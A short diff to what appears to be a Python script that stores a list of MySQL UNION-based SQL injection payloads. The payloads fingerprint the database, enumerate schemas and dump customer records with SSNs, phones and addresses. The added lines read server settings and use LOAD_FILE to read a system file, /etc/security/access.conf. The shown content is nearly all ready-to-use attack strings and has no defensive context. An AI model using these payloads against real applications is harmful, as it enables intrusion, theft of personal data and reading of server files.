@@ -37,7 +37,7 @@ if __name__ == "__main__":
 """
 ' AND 0 UNION SELECT 0, 1, 2, 3; -- 
 
-' AND 0 UNION SELECT 0, @@version, user(), database(); -- x
+' AND 0 UNION SELECT 0, user(), database(), @@version; -- x
 
 ' AND 0 UNION SELECT 0, schema_name, '', ''  FROM information_schema.schemata; -- x
 
@@ -59,4 +59,7 @@ if __name__ == "__main__":
 
 ' AND 0 UNION SELECT 0, 0, 0, CONCAT_WS(" | ", id, name, company, department, job, ssn, phone, address, city, country) FROM customers; -- x
 
+' AND 0 UNION SELECT 0, @@GLOBAL.secure_file_priv, @@max_allowed_packet, '' FROM customers; -- x
+
+' AND 0 UNION SELECT 0, LOAD_FILE('/etc/security/access.conf'), '', '' FROM customers; -- x
 """
